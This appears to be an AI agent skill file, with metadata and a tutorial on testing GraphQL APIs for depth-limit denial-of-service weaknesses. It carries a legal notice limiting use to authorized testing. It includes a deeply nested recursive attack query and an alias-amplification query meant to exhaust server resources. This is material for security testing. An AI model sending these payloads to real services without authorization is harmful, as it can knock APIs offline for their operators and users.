---
name: performing-graphql-depth-limit-attack
description: "Execute and test GraphQL depth limit attacks using deeply nested recursive queries. Signals: api attack, interface testing, graphql."
zh-signals: "Execute and test GraphQL depth limit attacks using deeply nested recursive 信号:api攻击,接口测试,graphql。"
when-to-use: Execute and test GraphQL depth limit attacks using deeply nested recursive
  queries to identify denial-of-service vulnerabilities in GraphQL APIs.
domain: cybersecurity
subdomain: api-security
tags:
- graphql
- depth-limit
- denial-of-service
- nested-queries
- api-security
- query-complexity
- resource-exhaustion
- penetration-testing
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1552.001
---

# Performing GraphQL Depth Limit Attack

## Overview

GraphQL depth limit attacks exploit the recursive nature of GraphQL schemas to craft deeply nested queries that consume excessive server resources, leading to denial of service. Unlike REST APIs with fixed endpoints, GraphQL allows clients to request arbitrary data structures. When schemas contain circular relationships (e.g., User -> Posts -> Author -> Posts), attackers can create queries that recurse indefinitely, overwhelming the server's CPU, memory, database connections, and network bandwidth.


## When to Use

- When conducting security assessments that involve performing graphql depth limit attack
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Target GraphQL API endpoint with introspection enabled or known schema
- GraphQL client tools (GraphiQL, Altair, Insomnia, or curl)
- Python 3.8+ with requests library for automated testing
- Burp Suite or mitmproxy for traffic analysis
- Authorization to perform security testing on the target


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Core Attack Techniques

### 1. Recursive Depth Attack

When a GraphQL schema has bidirectional relationships, queries can reference them recursively:

```graphql
# Schema with circular reference:
# type User { posts: [Post] }
# type Post { author: User }

# Attack query with excessive nesting depth
query DepthAttack {
  users {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        posts {
                          title
                          author {
                            name
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 2. Alias-Based Amplification

When batch queries are blocked, aliases can multiply the same field request within a single query:

```graphql
query AliasAmplification {
  a1: user(id: 1) { posts { author { name } } }
  a2: user(id: 1) { posts { author { name } } }
  a3: user(id: 1) { posts { author { name } } }
  a4: user(id: 1) { posts { author { name } } }
  a5: user(id: 1) { posts { author { name } } }
  a6: user(id: 1) { posts { author { name } } }
  a7: user(id: 1) { posts { author { name } } }
  a8: user(id: 1) { posts { author { name } } }
  a9: user(id: 1) { posts { author { name } } }
  a10: user(id: 1) { posts { author { name } } }
}
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
